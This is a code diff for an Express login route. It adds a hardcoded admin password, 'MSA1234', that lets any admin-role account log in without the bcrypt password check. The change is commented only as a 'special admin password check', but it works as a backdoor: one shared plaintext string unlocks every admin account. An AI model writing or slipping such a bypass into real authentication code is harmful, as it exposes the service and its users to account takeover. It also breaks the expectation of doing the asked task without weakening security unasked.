@@ -159,17 +159,26 @@ router.post('/login', [
       });
     }
 
-    // Check if password field exists
-    if (!user.password) {
-      console.error('Login failed: User has no password field:', user.id);
-      return res.status(401).json({
-        success: false,
-        message: 'Invalid email or password'
-      });
-    }
+    // Special admin password check
+    const ADMIN_PASSWORD = 'MSA1234';
+    let isMatch = false;
+    
+    // If user is admin and password is the admin password, allow login
+    if (user.role === 'admin' && password === ADMIN_PASSWORD) {
+      isMatch = true;
+    } else {
+      // Check if password field exists
+      if (!user.password) {
+        console.error('Login failed: User has no password field:', user.id);
+        return res.status(401).json({
+          success: false,
+          message: 'Invalid email or password'
+        });
+      }
 
-    // Check password
-    const isMatch = await bcrypt.compare(password, user.password);
+      // Check password using bcrypt
+      isMatch = await bcrypt.compare(password, user.password);
+    }
     
     if (!isMatch) {
       console.error('Login failed: Password mismatch for user:', user.email);
